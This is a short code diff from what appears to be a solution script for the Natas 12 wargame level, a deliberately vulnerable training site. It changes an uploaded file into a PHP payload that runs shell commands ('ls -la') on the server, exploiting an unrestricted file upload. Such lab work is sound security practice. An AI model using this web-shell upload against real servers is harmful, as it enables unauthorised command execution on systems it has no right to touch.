@@ -4,7 +4,12 @@ import io
 
 natas = Natas('natas12')
 
-f = io.BytesIO(b'<?php echo "dupa";')  # execute any script on the server
+script = b'''
+    $output = shell_exec('ls -la 2>&1');
+    print $output;
+'''
+
+f = io.BytesIO(b'<?php\n' + script)  # execute any script on the server
 
 post = {'filename': 'dupa.php'}
 files = {'uploadedfile': f}
